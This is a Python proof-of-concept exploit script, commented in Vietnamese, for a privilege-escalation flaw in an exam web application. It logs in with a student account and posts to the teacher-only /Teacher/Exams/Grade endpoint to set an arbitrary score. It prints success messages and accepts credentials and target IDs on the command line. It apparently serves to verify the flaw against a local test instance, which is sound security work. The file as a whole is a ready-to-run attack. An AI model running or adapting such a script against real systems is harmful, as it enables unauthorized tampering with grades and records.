#!/usr/bin/env python3
"""
PoC Script để exploit lỗ hổng phân quyền ở endpoint /Teacher/Exams/Grade
Lỗ hổng: Student có thể chấm điểm (privilege escalation)
"""

import requests
import sys

# Cấu hình
BASE_URL = "http://localhost:5000"
STUDENT_USERNAME = "student1"  # Thay bằng username của Student
STUDENT_PASSWORD = "password123"  # Thay bằng password của Student
SUBMISSION_ID = 1  # Thay bằng Submission ID thực tế
SCORE = 9.5        # Điểm muốn chấm (0-10)
EXAM_ID = 1        # Thay bằng Exam ID thực tế

def main():
    print("[*] PoC: Exploit Privilege Escalation - Student can grade exams")
    print("=" * 60)
    
    # Tạo session
    session = requests.Session()
    
    # Bước 1: Đăng nhập với tài khoản Student
    print(f"\n[1] Đăng nhập với tài khoản Student: {STUDENT_USERNAME}")
    login_data = {
        "Username": STUDENT_USERNAME,
        "Password": STUDENT_PASSWORD
    }
    
    try:
        login_response = session.post(
            f"{BASE_URL}/Auth/Login",
            data=login_data,
            allow_redirects=False
        )
        
        # Lấy token từ cookie
        token = session.cookies.get('access_token')
        
        if not token:
            print("[X] Không thể lấy access_token. Kiểm tra lại username/password.")
            print(f"    Status Code: {login_response.status_code}")
            print(f"    Response: {login_response.text[:200]}")
            return False
        
        print(f"[+] Đăng nhập thành công!")
        print(f"[+] Access Token: {token[:50]}...")
        
    except Exception as e:
        print(f"[X] Lỗi khi đăng nhập: {e}")
        return False
    
    # Bước 2: Gửi request chấm điểm
    print(f"\n[2] Gửi request chấm điểm...")
    print(f"    Submission ID: {SUBMISSION_ID}")
    print(f"    Score: {SCORE}")
    print(f"    Exam ID: {EXAM_ID}")
    
    grade_data = {
        "submissionId": SUBMISSION_ID,
        "score": SCORE,
        "examId": EXAM_ID
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"access_token={token}",
        "Referer": f"{BASE_URL}/Teacher/Exams/Detail/{EXAM_ID}"
    }
    
    try:
        response = session.post(
            f"{BASE_URL}/Teacher/Exams/Grade",
            headers=headers,
            data=grade_data,
            allow_redirects=False
        )
        
        print(f"\n[3] Kết quả:")
        print(f"    Status Code: {response.status_code}")
        
        if response.status_code in [200, 302, 303]:
            print(f"[+] VULNERABILITY EXPLOITED: Student đã chấm điểm thành công!")
            print(f"[+] Đã chấm điểm {SCORE} cho submission ID {SUBMISSION_ID}")
            
            if response.status_code in [302, 303]:
                location = response.headers.get('Location', 'N/A')
                print(f"[+] Redirected to: {location}")
            
            print("\n" + "=" * 60)
            print("[!] LỖ HỔNG ĐÃ ĐƯỢC KHAI THÁC THÀNH CÔNG!")
            print("[!] Student đã có thể chấm điểm (Privilege Escalation)")
            print("=" * 60)
            return True
            
        elif response.status_code == 400:
            print(f"[X] Bad Request (400)")
            print(f"    Response: {response.text[:500]}")
            print(f"\n[!] Có thể do:")
            print(f"    - Submission ID không tồn tại")
            print(f"    - Exam ID không tồn tại")
            print(f"    - Score không hợp lệ (phải trong khoảng 0-10)")
            return False
            
        elif response.status_code == 401:
            print(f"[X] Unauthorized (401)")
            print(f"    Token không hợp lệ hoặc đã hết hạn")
            return False
            
        elif response.status_code == 403:
            print(f"[X] Forbidden (403)")
            print(f"    Không có quyền truy cập (nhưng lỗ hổng đã được fix?)")
            return False
            
        else:
            print(f"[X] Request failed với status code: {response.status_code}")
            print(f"    Response: {response.text[:500]}")
            return False
            
    except Exception as e:
        print(f"[X] Lỗi khi gửi request: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print("Usage: python3 test_exploit.py [username] [password] [submissionId] [score] [examId]")
            print("\nExample:")
            print("  python3 test_exploit.py student1 password123 1 9.5 1")
            sys.exit(0)
        else:
            if len(sys.argv) >= 6:
                STUDENT_USERNAME = sys.argv[1]
                STUDENT_PASSWORD = sys.argv[2]
                SUBMISSION_ID = int(sys.argv[3])
                SCORE = float(sys.argv[4])
                EXAM_ID = int(sys.argv[5])
    
    success = main()
    sys.exit(0 if success else 1)

